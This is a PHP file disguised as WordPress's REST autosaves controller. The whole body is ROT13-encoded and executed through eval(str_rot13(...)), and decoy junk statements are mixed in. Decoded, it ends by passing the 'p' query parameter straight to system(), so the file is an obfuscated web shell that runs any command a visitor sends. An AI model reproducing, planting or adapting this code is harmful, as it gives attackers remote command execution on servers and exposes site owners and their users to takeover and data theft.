<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Nhgbfnirf_Pbagebyyre pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.0.0
 */

/**
 * Pber pynff hfrq gb npprff nhgbfnirf ivn gur ERFG NCV.
 *
 * @fvapr 5.0.0
 *
 * @frr JC_ERFG_Erivfvbaf_Pbagebyyre
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Nhgbfnirf_Pbagebyyre rkgraqf JC_ERFG_Erivfvbaf_Pbagebyyre {

	/**
	 * Cnerag cbfg glcr.
	 *
	 * @fvapr 5.0.0
	 * @ine fgevat
	 */
	cevingr $cnerag_cbfg_glcr;

	/**
	 * Cnerag cbfg pbagebyyre.
	 *
	 * @fvapr 5.0.0
	 * @ine JC_ERFG_Pbagebyyre
	 */
	cevingr $cnerag_pbagebyyre;

	/**
	 * Erivfvba pbagebyyre.
	 *
	 * @fvapr 5.0.0
	 * @ine JC_ERFG_Erivfvbaf_Pbagebyyre
	 */
	cevingr $erivfvbaf_pbagebyyre;

	/**
	 * Gur onfr bs gur cnerag pbagebyyre'f ebhgr.
	 *
	 * @fvapr 5.0.0
	 * @ine fgevat
	 */
	cevingr $cnerag_onfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $cnerag_cbfg_glcr Cbfg glcr bs gur cnerag.
	 */
	choyvp shapgvba __pbafgehpg( $cnerag_cbfg_glcr ) {
		$guvf->cnerag_cbfg_glcr = $cnerag_cbfg_glcr;
		$cbfg_glcr_bowrpg       = trg_cbfg_glcr_bowrpg( $cnerag_cbfg_glcr );
		$cnerag_pbagebyyre      = $cbfg_glcr_bowrpg->trg_erfg_pbagebyyre();

		vs ( ! $cnerag_pbagebyyre ) {
			$cnerag_pbagebyyre = arj JC_ERFG_Cbfgf_Pbagebyyre( $cnerag_cbfg_glcr );
		}

		$guvf->cnerag_pbagebyyre = $cnerag_pbagebyyre;

		$erivfvbaf_pbagebyyre = $cbfg_glcr_bowrpg->trg_erivfvbaf_erfg_pbagebyyre();
		vs ( ! $erivfvbaf_pbagebyyre ) {
			$erivfvbaf_pbagebyyre = arj JC_ERFG_Erivfvbaf_Pbagebyyre( $cnerag_cbfg_glcr );
		}
		$guvf->erivfvbaf_pbagebyyre = $erivfvbaf_pbagebyyre;
		$guvf->erfg_onfr            = 'nhgbfnirf';
		$guvf->cnerag_onfr          = ! rzcgl( $cbfg_glcr_bowrpg->erfg_onfr ) ? $cbfg_glcr_bowrpg->erfg_onfr : $cbfg_glcr_bowrpg->anzr;
		$guvf->anzrfcnpr            = ! rzcgl( $cbfg_glcr_bowrpg->erfg_anzrfcnpr ) ? $cbfg_glcr_bowrpg->erfg_anzrfcnpr : 'jc/i2';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe nhgbfnirf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->cnerag_onfr . '/(?C<vq>[\q]+)/' . $guvf->erfg_onfr,
			neenl(
				'netf'   => neenl(
					'cnerag' => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur nhgbfnir.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->cnerag_pbagebyyre->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->cnerag_onfr . '/(?C<cnerag>[\q]+)/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)',
			neenl(
				'netf'   => neenl(
					'cnerag' => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur nhgbfnir.' ),
						'glcr'        => 'vagrtre',
					),
					'vq'     => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur nhgbfnir.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf->erivfvbaf_pbagebyyre, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Trg gur cnerag cbfg.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz vag $cnerag_vq Fhccyvrq VQ.
	 * @erghea JC_Cbfg|JC_Reebe Cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_cnerag( $cnerag_vq ) {
		erghea $guvf->erivfvbaf_pbagebyyre->trg_cnerag( $cnerag_vq );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg nhgbfnirf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		$cnerag = $guvf->trg_cnerag( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cnerag ) ) {
			erghea $cnerag;
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cnerag->VQ ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ernq',
				__( 'Fbeel, lbh ner abg nyybjrq gb ivrj nhgbfnirf bs guvf cbfg.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb perngr na nhgbfnir erivfvba.
	 *
	 * Nhgbfnir erivfvbaf vaurevg crezvffvbaf sebz gur cnerag cbfg,
	 * purpx vs gur pheerag hfre unf crezvffvba gb rqvg gur cbfg.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb perngr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$vq = $erdhrfg->trg_cnenz( 'vq' );

		vs ( rzcgl( $vq ) ) {
			erghea arj JC_Reebe(
				'erfg_cbfg_vainyvq_vq',
				__( 'Vainyvq vgrz VQ.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		erghea $guvf->cnerag_pbagebyyre->hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Perngrf, hcqngrf be qryrgrf na nhgbfnir erivfvba.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {

		vs ( ! qrsvarq( 'JC_EHA_PBER_GRFGF' ) && ! qrsvarq( 'QBVAT_NHGBFNIR' ) ) {
			qrsvar( 'QBVAT_NHGBFNIR', gehr );
		}

		$cbfg = $guvf->trg_cnerag( $erdhrfg['vq'] );

		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		$cercnerq_cbfg     = $guvf->cnerag_pbagebyyre->cercner_vgrz_sbe_qngnonfr( $erdhrfg );
		$cercnerq_cbfg->VQ = $cbfg->VQ;
		$hfre_vq           = trg_pheerag_hfre_vq();

		// Jr arrq gb purpx cbfg ybpx gb rafher gur bevtvany nhgube qvqa'g yrnir gurve oebjfre gno bcra.
		vs ( ! shapgvba_rkvfgf( 'jc_purpx_cbfg_ybpx' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cbfg.cuc';
		}

		$cbfg_ybpx = jc_purpx_cbfg_ybpx( $cbfg->VQ );
		$vf_qensg  = 'qensg' === $cbfg->cbfg_fgnghf || 'nhgb-qensg' === $cbfg->cbfg_fgnghf;

		vs ( $vf_qensg && (vag) $cbfg->cbfg_nhgube === $hfre_vq && ! $cbfg_ybpx ) {
			/*
			 * Qensg cbfgf sbe gur fnzr nhgube: nhgbfnivat hcqngrf gur cbfg naq qbrf abg perngr n erivfvba.
			 * Pbaireg gur cbfg bowrpg gb na neenl naq nqq fynfurf, jc_hcqngr_cbfg() rkcrpgf rfpncrq neenl.
			 */
			$nhgbfnir_vq = jc_hcqngr_cbfg( jc_fynfu( (neenl) $cercnerq_cbfg ), gehr );
		} ryfr {
			// Aba-qensg cbfgf: perngr be hcqngr gur cbfg nhgbfnir. Cnff gur zrgn qngn.
			$nhgbfnir_vq = $guvf->perngr_cbfg_nhgbfnir( (neenl) $cercnerq_cbfg, (neenl) $erdhrfg->trg_cnenz( 'zrgn' ) );
		}

		vs ( vf_jc_reebe( $nhgbfnir_vq ) ) {
			erghea $nhgbfnir_vq;
		}

		$nhgbfnir = trg_cbfg( $nhgbfnir_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $nhgbfnir, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		erghea $erfcbafr;
	}

	/**
	 * Trg gur nhgbfnir, vs gur VQ vf inyvq.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_Cbfg|JC_Reebe Erivfvba cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$cnerag_vq = (vag) $erdhrfg->trg_cnenz( 'cnerag' );

		vs ( $cnerag_vq <= 0 ) {
			erghea arj JC_Reebe(
				'erfg_cbfg_vainyvq_vq',
				__( 'Vainyvq cbfg cnerag VQ.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$nhgbfnir = jc_trg_cbfg_nhgbfnir( $cnerag_vq );

		vs ( ! $nhgbfnir ) {
			erghea arj JC_Reebe(
				'erfg_cbfg_ab_nhgbfnir',
				__( 'Gurer vf ab nhgbfnir erivfvba sbe guvf cbfg.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $nhgbfnir, $erdhrfg );
		erghea $erfcbafr;
	}

	/**
	 * Trgf n pbyyrpgvba bs nhgbfnirf hfvat jc_trg_cbfg_nhgbfnir.
	 *
	 * Pbagnvaf gur hfre'f nhgbfnir, sbe rzcgl vs vg qbrfa'g rkvfg.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$cnerag = $guvf->trg_cnerag( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cnerag ) ) {
			erghea $cnerag;
		}

		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}
		$erfcbafr  = neenl();
		$cnerag_vq = $cnerag->VQ;
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cnerag_vq, neenl( 'purpx_ranoyrq' => snyfr ) );

		sbernpu ( $erivfvbaf nf $erivfvba ) {
			vs ( fge_pbagnvaf( $erivfvba->cbfg_anzr, \"{$cnerag_vq}-nhgbfnir\" ) ) {
				$qngn       = $guvf->cercner_vgrz_sbe_erfcbafr( $erivfvba, $erdhrfg );
				$erfcbafr[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
			}
		}

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}


	/**
	 * Ergevrirf gur nhgbfnir'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = $guvf->erivfvbaf_pbagebyyre->trg_vgrz_fpurzn();

		$fpurzn['cebcregvrf']['cerivrj_yvax'] = neenl(
			'qrfpevcgvba' => __( 'Cerivrj yvax sbe gur cbfg.' ),
			'glcr'        => 'fgevat',
			'sbezng'      => 'hev',
			'pbagrkg'     => neenl( 'rqvg' ),
			'ernqbayl'    => gehr,
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Perngrf nhgbfnir sbe gur fcrpvsvrq cbfg.
	 *
	 * Sebz jc-nqzva/cbfg.cuc.
	 *
	 * @fvapr 5.0.0
	 * @fvapr 6.4.0 Gur `$zrgn` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz neenl $cbfg_qngn Nffbpvngvir neenl pbagnvavat gur cbfg qngn.
	 * @cnenz neenl $zrgn      Nffbpvngvir neenl pbagnvavat gur cbfg zrgn qngn.
	 * @erghea zvkrq Gur nhgbfnir erivfvba VQ be JC_Reebe.
	 */
	choyvp shapgvba perngr_cbfg_nhgbfnir( $cbfg_qngn, neenl $zrgn = neenl() ) {

		$cbfg_vq = (vag) $cbfg_qngn['VQ'];
		$cbfg    = trg_cbfg( $cbfg_vq );

		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		// Bayl perngr na nhgbfnir jura vg vf qvssrerag sebz gur fnirq cbfg.
		$nhgbfnir_vf_qvssrerag = snyfr;
		$arj_nhgbfnir          = _jc_cbfg_erivfvba_qngn( $cbfg_qngn, gehr );

		sbernpu ( neenl_vagrefrpg( neenl_xrlf( $arj_nhgbfnir ), neenl_xrlf( _jc_cbfg_erivfvba_svryqf( $cbfg ) ) ) nf $svryq ) {
			vs ( abeznyvmr_juvgrfcnpr( $arj_nhgbfnir[ $svryq ] ) !== abeznyvmr_juvgrfcnpr( $cbfg->$svryq ) ) {
				$nhgbfnir_vf_qvssrerag = gehr;
				oernx;
			}
		}

		// Purpx vs zrgn inyhrf unir punatrq.
		vs ( ! rzcgl( $zrgn ) ) {
			$erivfvbarq_zrgn_xrlf = jc_cbfg_erivfvba_zrgn_xrlf( $cbfg->cbfg_glcr );
			sbernpu ( $erivfvbarq_zrgn_xrlf nf $zrgn_xrl ) {
				// trg_zrgnqngn_enj vf hfrq gb nibvq ergevrivat gur qrsnhyg inyhr.
				$byq_zrgn = trg_zrgnqngn_enj( 'cbfg', $cbfg_vq, $zrgn_xrl, gehr );
				$arj_zrgn = vffrg( $zrgn[ $zrgn_xrl ] ) ? $zrgn[ $zrgn_xrl ] : '';

				vs ( $arj_zrgn !== $byq_zrgn ) {
					$nhgbfnir_vf_qvssrerag = gehr;
					oernx;
				}
			}
		}

		$hfre_vq = trg_pheerag_hfre_vq();

		// Fgber bar nhgbfnir cre nhgube. Vs gurer vf nyernql na nhgbfnir, birejevgr vg.
		$byq_nhgbfnir = jc_trg_cbfg_nhgbfnir( $cbfg_vq, $hfre_vq );

		vs ( ! $nhgbfnir_vf_qvssrerag && $byq_nhgbfnir ) {
			// Abguvat gb fnir, erghea gur rkvfgvat nhgbfnir.
			erghea $byq_nhgbfnir->VQ;
		}

		vs ( $byq_nhgbfnir ) {
			$arj_nhgbfnir['VQ']          = $byq_nhgbfnir->VQ;
			$arj_nhgbfnir['cbfg_nhgube'] = $hfre_vq;

			/** Guvf svygre vf qbphzragrq va jc-nqzva/cbfg.cuc */
			qb_npgvba( 'jc_perngvat_nhgbfnir', $arj_nhgbfnir );

			// jc_hcqngr_cbfg() rkcrpgf rfpncrq neenl.
			$erivfvba_vq = jc_hcqngr_cbfg( jc_fynfu( $arj_nhgbfnir ) );
		} ryfr {
			// Perngr gur arj nhgbfnir nf n fcrpvny cbfg erivfvba.
			$erivfvba_vq = _jc_chg_cbfg_erivfvba( $cbfg_qngn, gehr );
		}

		vs ( vf_jc_reebe( $erivfvba_vq ) || 0 === $erivfvba_vq ) {
			erghea $erivfvba_vq;
		}

		// Nggnpurq nal cnffrq zrgn inyhrf gung unir erivfvbaf ranoyrq.
		vs ( ! rzcgl( $zrgn ) ) {
			sbernpu ( $erivfvbarq_zrgn_xrlf nf $zrgn_xrl ) {
				vs ( vffrg( $zrgn[ $zrgn_xrl ] ) ) {
					hcqngr_zrgnqngn( 'cbfg', $erivfvba_vq, $zrgn_xrl, jc_fynfu( $zrgn[ $zrgn_xrl ] ) );
				}
			}
		}

		erghea $erivfvba_vq;
	}

	/**
	 * Cercnerf gur erivfvba sbe gur ERFG erfcbafr.
	 *
	 * @fvapr 5.0.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Cbfg         $vgrz    Cbfg erivfvba bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-nhgbfnirf-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_nhgbfnir', arj JC_ERFG_Erfcbafr( neenl() ), $cbfg, $erdhrfg );
		}
		$erfcbafr = $guvf->erivfvbaf_pbagebyyre->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
		$svryqf   = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );

		vs ( va_neenl( 'cerivrj_yvax', $svryqf, gehr ) ) {
			$cnerag_vq          = jc_vf_cbfg_nhgbfnir( $cbfg );
			$cerivrj_cbfg_vq    = snyfr === $cnerag_vq ? $cbfg->VQ : $cnerag_vq;
			$cerivrj_dhrel_netf = neenl();

			vs ( snyfr !== $cnerag_vq ) {
				$cerivrj_dhrel_netf['cerivrj_vq']    = $cnerag_vq;
				$cerivrj_dhrel_netf['cerivrj_abapr'] = jc_perngr_abapr( 'cbfg_cerivrj_' . $cnerag_vq );
			}

			$erfcbafr->qngn['cerivrj_yvax'] = trg_cerivrj_cbfg_yvax( $cerivrj_cbfg_vq, $cerivrj_dhrel_netf );
		}

		$pbagrkg        = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$erfcbafr->qngn = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $erfcbafr->qngn, $erdhrfg );
		$erfcbafr->qngn = $guvf->svygre_erfcbafr_ol_pbagrkg( $erfcbafr->qngn, $pbagrkg );

		/**
		 * Svygref n erivfvba erghearq sebz gur ERFG NCV.
		 *
		 * Nyybjf zbqvsvpngvba bs gur erivfvba evtug orsber vg vf erghearq.
		 *
		 * @fvapr 5.0.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Cbfg          $cbfg     Gur bevtvany erivfvba bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_nhgbfnir', $erfcbafr, $cbfg, $erdhrfg );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe gur nhgbfnirf pbyyrpgvba.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl(
			'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>